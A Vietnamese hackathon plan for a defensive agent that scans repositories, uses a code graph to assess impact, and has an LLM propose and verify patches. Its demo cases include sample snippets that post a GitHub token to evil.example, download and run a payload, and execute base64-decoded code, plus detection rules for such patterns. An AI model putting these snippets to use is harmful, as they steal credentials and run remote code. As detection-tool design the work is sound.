# Hackathon 3h — RepoGuard Agent

## CodeGraph-powered Security & Refactor Agent

## 1. Tổng quan sản phẩm

**RepoGuard Agent** là agent giúp phân tích và làm sạch repo code.

Sản phẩm nhận vào một source repo, sau đó:

```text
scan repo
→ phát hiện security issue / malware pattern / dead code
→ dùng CodeGraph để hiểu impact trong repo
→ LLM agent tạo patch/refactor
→ apply patch
→ verify bằng scanner/test/diff
→ xuất dashboard/report
```

Một câu pitch:

> RepoGuard Agent dùng CodeGraph để hiểu cấu trúc repo, dùng scanner để phát hiện lỗi bảo mật, mã độc và code thừa, sau đó dùng LLM agent để tạo patch tối thiểu, loại bỏ hoặc refactor code, rồi verify lại bằng scan/test/diff.

---

## 2. Scope MVP

MVP không cố làm SAST platform hoàn chỉnh.

MVP chỉ cần demo chắc 5 loại vấn đề:

```text
1. Malware pattern: base64 decode → exec/eval
2. Security issue: env secret → network request
3. Malware/dropper: download → write → exec
4. Security issue: subprocess shell=True / command injection risk
5. Code cleanup: unused function/class/module dựa trên CodeGraph callers/imports
```

MVP output phải có:

```text
- finding
- severity
- confidence
- file/line/snippet
- behavior_path nếu là security/malware
- codegraph_context nếu cần hiểu impact
- target_region cần sửa/xóa
- patch proposal
- diff
- verification result
```

---

## 3. Kiến trúc cuối

```text
Repo
 ↓
CodeGraph Index
 - symbols
 - imports
 - callers/callees
 - impact context
 ↓
Static Scanner
 - malware rules
 - security rules
 - dead-code heuristics
 ↓
Finding[]
 - file / line / snippet
 - severity / confidence
 - behavior_path
 - codegraph_context
 - target_region
 ↓
LLM Remediation Agent
 - remove
 - quarantine
 - safe_replace
 - refactor
 - needs_review
 ↓
Patcher
 - apply patch
 - generate diff
 ↓
Verifier
 - rerun scanner
 - run tests/lint if available
 - compare before/after
 ↓
Dashboard / Report
```

Không có **Issue Graph**.

Thay vào đó chỉ dùng:

```text
Finding[]
+ behavior_path
+ codegraph_context
+ target_region
+ patch proposal
+ verification result
```

---

## 4. Vai trò từng thành phần

## 4.1 CodeGraph — repo understanding layer

CodeGraph dùng để giúp agent hiểu repo:

```text
- function này được gọi ở đâu?
- class này có được instantiate không?
- module này có ai import không?
- file này ảnh hưởng đến file nào?
- nếu xóa function/class/module này thì impact ra sao?
```

CodeGraph không phải detector duy nhất.

CodeGraph cung cấp context cho LLM agent trước khi sửa code.

Ví dụ:

```text
Finding: unused function old_helper()

CodeGraph context:
- callers: []
- imports: []
- exported: false
- referenced_by_tests: false

Agent action:
- remove function
```

Ví dụ khác:

```text
Finding: dangerous_exec()

CodeGraph context:
- called_by: main.py:run_plugin()
- called_by: worker.py:load_task()
- imported_by: app.py

Agent action:
- quarantine dangerous line, không xóa toàn bộ function
```

---

## 4.2 Static Scanner — evidence layer

Scanner dùng Python AST để phát hiện vấn đề có bằng chứng.

Nó không chạy code.

Các rule chính:

```text
PY-DECODE-EXEC
- exec(base64.b64decode(...))
- eval(binascii.unhexlify(...))

PY-ENV-EXFIL
- os.environ["TOKEN"]
- os.getenv("SECRET")
- requests.post(...) / urllib.request.urlopen(...)

PY-DROPPER
- requests.get(...)
- open(..., "w")
- subprocess.run(...) / os.system(...)

PY-SHELL-INJECTION
- subprocess.run(..., shell=True)
- os.system(f"...{user_input}...")

PY-PICKLE-NETWORK
- pickle.loads(requests.get(...).content)
```

Scanner output là `Finding[]`.

---

## 4.3 Behavior Path — chỉ là field trong Finding

Không build module Issue Graph riêng.

Với security/malware issue, scanner hoặc analyzer sinh `behavior_path`.

Ví dụ:

```text
main()
→ decode_payload()
→ TRANSFORM: base64.b64decode
→ SINK: exec
```

Hoặc:

```text
collect_secret()
→ SOURCE: os.environ["GITHUB_TOKEN"]
→ send()
→ SINK: requests.post
```

Hoặc:

```text
download_payload()
→ SINK: requests.get
→ write_payload()
→ SINK: open(..., "w")
→ run_payload()
→ SINK: subprocess.run
```

---

## 4.4 LLM Remediation Agent — core reasoning layer

LLM là core agent, nhưng không được sửa mù.

LLM nhận:

```text
- Finding
- target_region
- code slice
- behavior_path
- CodeGraph callers/callees/imports
- test command nếu có
```

LLM trả về structured patch:

```text
remove
quarantine
safe_replace
refactor
needs_review
```

Quy tắc:

```text
- Không tự ý sửa ngoài target_region nếu không có lý do.
- Không thêm network call mới.
- Không thêm eval/exec mới.
- Không obfuscate code.
- Nếu không chắc, chọn needs_review.
- Patch phải tối thiểu.
- Sau patch phải rerun scanner/test.
```

---

## 4.5 Patcher

Patcher nhận `PatchProposal`, sửa file, tạo diff.

Không để LLM tự ghi file trực tiếp.

Flow:

```text
LLM sinh PatchProposal JSON
→ patcher validate line range
→ patcher apply replacement
→ git diff hoặc difflib diff
```

---

## 4.6 Verifier

Verifier là safety layer.

Sau khi patch:

```text
1. rerun scanner
2. check finding cũ còn không
3. run test/lint nếu có
4. generate before/after report
5. nếu fail thì rollback hoặc mark failed
```

Patch chỉ được coi là thành công nếu:

```text
- finding biến mất hoặc severity giảm
- không sinh finding mới nghiêm trọng hơn
- test/lint không fail nếu có
```

---

# 5. Data contract

## 5.1 Finding

```python
from dataclasses import dataclass, field
from typing import Literal

Category = Literal["security", "malware", "dead_code", "refactor"]
Severity = Literal["high", "medium", "low"]
Action = Literal["remove", "quarantine", "safe_replace", "refactor", "needs_review"]

@dataclass
class TargetRegion:
    file: str
    start_line: int
    end_line: int

@dataclass
class Evidence:
    file: str
    line: int
    snippet: str
    message: str

@dataclass
class Finding:
    id: str
    category: Category
    rule_id: str
    title: str
    severity: Severity
    confidence: float
    file: str
    line: int
    snippet: str
    message: str
    target_region: TargetRegion
    behavior_path: list[str] = field(default_factory=list)
    codegraph_context: dict = field(default_factory=dict)
    evidence: list[Evidence] = field(default_factory=list)
```

## 5.2 PatchProposal

```python
@dataclass
class PatchProposal:
    finding_id: str
    action: Action
    file: str
    start_line: int
    end_line: int
    replacement: str
    rationale: str
    expected_risk_reduction: str
```

## 5.3 VerificationResult

```python
@dataclass
class VerificationResult:
    finding_id: str
    status: Literal["patched", "failed", "needs_review"]
    before_severity: str
    after_severity: str | None
    scanner_passed: bool
    tests_passed: bool | None
    diff: str
    notes: str
```

## 5.4 RepoGuardReport

```python
@dataclass
class RepoGuardReport:
    repo_path: str
    findings: list[Finding]
    patches: list[PatchProposal]
    verification: list[VerificationResult]
```

---

# 6. Repo layout

```text
repoguard/
  models.py
  scanner.py
  rules/
    malware_rules.py
    security_rules.py
    dead_code_rules.py
  codegraph_client.py
  repo_context.py
  agent.py
  patcher.py
  verifier.py
  report.py
  cli.py
  dashboard/
    app.py

tests/
  corpus/
    malicious/
    vulnerable/
    dead_code/
    benign/

README.md
demo-script.md
```

---

# 7. Chia việc 3 người

## Người 1 — Scanner + Rules + Finding output

Sở hữu:

```text
models.py
scanner.py
rules/malware_rules.py
rules/security_rules.py
rules/dead_code_rules.py
cli.py
```

Nhiệm vụ:

```text
- parse Python files bằng ast
- detect malware/security patterns
- detect simple dead-code candidates nếu CodeGraph chưa sẵn
- output Finding[]
- đảm bảo mỗi Finding có target_region
```

Rule bắt buộc:

```text
1. base64 decode → exec/eval
2. env secret → network
3. download → write → exec
4. subprocess shell=True
5. unused function/class candidate
```

Acceptance:

```bash
python -m repoguard scan tests/corpus --json > report.json
```

Phải ra finding cho:

```text
base64_exec.py
env_exfil.py
dropper.py
shell_injection.py
unused_helpers.py
```

---

## Người 2 — CodeGraph + LLM Agent + Patcher + Verifier

Sở hữu:

```text
codegraph_client.py
repo_context.py
agent.py
patcher.py
verifier.py
```

Nhiệm vụ:

```text
- setup/wrap CodeGraph
- lấy callers/callees/imports/symbol references
- enrich Finding.codegraph_context
- gọi LLM để sinh PatchProposal
- validate patch proposal
- apply patch
- rerun scanner
- generate diff
```

CodeGraph functions tối thiểu:

```python
def get_callers(symbol: str) -> list[dict]: ...
def get_callees(symbol: str) -> list[dict]: ...
def get_importers(module: str) -> list[dict]: ...
def get_symbol_references(symbol: str) -> list[dict]: ...
def get_file_impact(file: str) -> dict: ...
```

Fallback nếu CodeGraph lỗi:

```text
- AST local function map
- grep import
- grep symbol name
- mark confidence lower
```

Acceptance:

```bash
python -m repoguard fix tests/corpus/malicious/base64_exec.py --apply
```

Output phải có:

```text
Finding detected
Patch proposed
Patch applied
Scanner rerun
Diff shown
```

---

## Người 3 — Dashboard + Corpus + Demo

Sở hữu:

```text
dashboard/app.py
tests/corpus/
report.py
README.md
demo-script.md
```

Nhiệm vụ:

```text
- tạo corpus demo
- tạo report mock trước khi backend xong
- dashboard đọc report.json/remediation_report.json
- hiển thị findings, CodeGraph context, diff, verification
- chuẩn bị demo script 2–3 phút
```

Dashboard tabs:

```text
1. Findings
2. CodeGraph Context
3. Patch Diff
4. Verification
```

Acceptance:

```bash
streamlit run repoguard/dashboard/app.py
```

Dashboard hiển thị được:

```text
- finding list
- severity/confidence
- target region
- behavior path
- CodeGraph callers/imports
- patch diff
- before/after verification
```

---

# 8. Corpus demo

## Malicious / Security

```text
tests/corpus/malicious/base64_exec.py
tests/corpus/malicious/env_exfil.py
tests/corpus/malicious/dropper.py
tests/corpus/vulnerable/shell_injection.py
tests/corpus/vulnerable/pickle_network.py
```

## Dead code / refactor

```text
tests/corpus/dead_code/unused_function.py
tests/corpus/dead_code/unused_class.py
tests/corpus/dead_code/unused_module.py
```

## Benign

```text
tests/corpus/benign/base64_image_decode.py
tests/corpus/benign/read_env_config.py
tests/corpus/benign/requests_get_public_api.py
tests/corpus/benign/subprocess_git_version.py
```

Mục tiêu:

```text
- malicious/security fixtures được flag
- benign fixtures không bị high severity
- dead-code fixtures có CodeGraph context rõ
```

---

# 9. Demo cases

## Case 1 — Malware: base64 decode → exec

Before:

```python
payload = "cHJpbnQoJ3B3bmVkJyk="
exec(base64.b64decode(payload))
```

Finding:

```text
PY-DECODE-EXEC
severity: high
target_region: line chứa exec
```

Patch:

```python
raise RuntimeError("Blocked suspicious decoded dynamic execution")
```

Demo message:

> Agent phát hiện decoded payload được execute, quarantine dòng nguy hiểm, rerun scanner và finding biến mất.

---

## Case 2 — Security: env secret → network

Before:

```python
token = os.environ["GITHUB_TOKEN"]
requests.post("https://evil.example/collect", data={"token": token})
```

Finding:

```text
PY-ENV-EXFIL
severity: high
behavior_path: env secret → requests.post
```

Patch:

```python
# Removed suspicious credential exfiltration.
return None
```

Demo message:

> Agent phát hiện secret source đi vào network sink, xóa exfiltration path.

---

## Case 3 — Dropper: download → write → exec

Before:

```python
r = requests.get("https://evil.example/payload.py")
open("payload.py", "w").write(r.text)
subprocess.run(["python", "payload.py"])
```

Finding:

```text
PY-DROPPER
severity: high
behavior_path: download → write → exec
```

Patch:

```python
raise RuntimeError("Blocked suspicious download-write-execute chain")
```

Demo message:

> Agent không chỉ thấy từng API, mà phát hiện cả chain download-write-execute.

---

## Case 4 — Refactor: unused function

Before:

```python
def old_helper():
    ...
```

CodeGraph context:

```text
callers: []
references: []
importers: []
```

Action:

```text
remove or needs_review
```

Demo message:

> CodeGraph giúp agent biết function này không có caller/reference, nên có thể đề xuất xóa an toàn hơn.

---

# 10. Timeline 180 phút

| Mốc       | Người 1 — Scanner          | Người 2 — CodeGraph/Agent        | Người 3 — Dashboard/Corpus |
| --------- | -------------------------- | -------------------------------- | -------------------------- |
| 0:00–0:15 | Chốt models.py + schema    | Chốt models.py + schema          | Chốt models.py + schema    |
| 0:15–0:45 | scanner + base64→exec      | CodeGraph setup/wrapper skeleton | corpus + mock report       |
| 0:45–1:15 | env→network + shell=True   | agent prompt + patcher           | dashboard skeleton         |
| 1:15–1:45 | dropper + target_region    | verifier + rerun scanner         | dashboard đọc report thật  |
| 1:45–2:15 | dead-code candidate output | CodeGraph context enrich         | diff/verification UI       |
| 2:15–2:40 | integration                | fix command end-to-end           | README/demo script         |
| 2:40–3:00 | demo dry-run, bugfix only  | demo dry-run, bugfix only        | demo dry-run, bugfix only  |

---

# 11. CLI commands

## Scan only

```bash
python -m repoguard scan ./tests/corpus --json > report.json
```

## Fix one repo

```bash
python -m repoguard fix ./tests/corpus --apply
```

## Fix dry-run

```bash
python -m repoguard fix ./tests/corpus --dry-run
```

## Dashboard

```bash
streamlit run repoguard/dashboard/app.py
```

---

# 12. Verification

MVP được coi là pass nếu:

```text
1. Scan phát hiện ít nhất 4/5 fixtures chính
2. Mỗi finding có target_region
3. LLM sinh được PatchProposal JSON hợp lệ
4. Patcher apply được ít nhất 2 patch
5. Verifier rerun scanner và cho before/after
6. Dashboard hiển thị finding + CodeGraph context + diff + verification
```

Case demo bắt buộc:

```text
- base64 decode → exec: patched
- env secret → network: patched hoặc quarantined
- unused function: CodeGraph context hiển thị 0 callers
```

---

# 13. Quy tắc cắt scope

Nếu trễ, giữ:

```text
- scanner
- CodeGraph context tối thiểu
- LLM patch proposal
- diff
- verifier rerun scanner
- dashboard đọc JSON
```

Bỏ:

```text
- Issue Graph
- full behavior graph engine
- full taint analysis
- deploy
- database
- React frontend
- real malware dataset
- multi-language support
```

Nếu CodeGraph setup lỗi:

```text
- dùng AST/grep fallback
- pitch CodeGraph integration as intended architecture
- demo vẫn chạy bằng scanner + LLM patch + verifier
```

---

# 14. Không làm trong MVP

```text
- Không build Issue Graph
- Không full data-flow/taint analysis
- Không execute code bị scan
- Không auto-delete khi confidence thấp
- Không sửa ngoài target_region nếu không có lý do rõ
- Không deploy
- Không scan malware thật trong live demo
```

---

# 15. LLM agent prompt

```text
You are RepoGuard Remediation Agent.

You receive:
1. A deterministic finding from the scanner
2. The target region to patch
3. A code slice
4. Optional behavior_path
5. CodeGraph context: callers, callees, imports, references
6. Verification constraints

Your task:
- Propose the smallest safe patch.
- Choose one action:
  remove, quarantine, safe_replace, refactor, needs_review.
- Do not invent files, functions, or usages.
- Do not add new network calls.
- Do not add eval/exec.
- Do not hide behavior with obfuscation.
- Preserve benign functionality when obvious.
- If unsure, choose needs_review.
- Return structured JSON only.

Output:
{
  "finding_id": "...",
  "action": "remove | quarantine | safe_replace | refactor | needs_review",
  "file": "...",
  "start_line": 1,
  "end_line": 3,
  "replacement": "...",
  "rationale": "...",
  "expected_risk_reduction": "..."
}
```

---

# 16. Pitch summary

## Một câu

RepoGuard Agent dùng CodeGraph để hiểu repo, scanner để phát hiện lỗi bảo mật/mã độc/code thừa, và LLM agent để tạo patch/refactor có kiểm chứng.

## Khác gì scanner thường?

Scanner thường chỉ báo lỗi.

RepoGuard đi thêm 3 bước:

```text
understand impact with CodeGraph
→ patch with LLM
→ verify with scanner/test/diff
```

## Khác gì LLM coding assistant?

LLM coding assistant thường sửa theo prompt.

RepoGuard chỉ sửa khi có:

```text
Finding
+ target_region
+ CodeGraph context
+ verification loop
```

## Engineering Depth

```text
- AST-based scanner
- CodeGraph repo understanding
- target region extraction
- structured LLM patch proposal
- patch application
- verification loop
- dashboard triage
```

## Demo line

> Em sẽ demo 3 bước: scan repo để phát hiện mã độc/lỗi/code thừa, dùng CodeGraph để hiểu đoạn đó có ảnh hưởng ở đâu, rồi LLM agent tạo patch, apply và scan lại để chứng minh issue đã được loại bỏ.
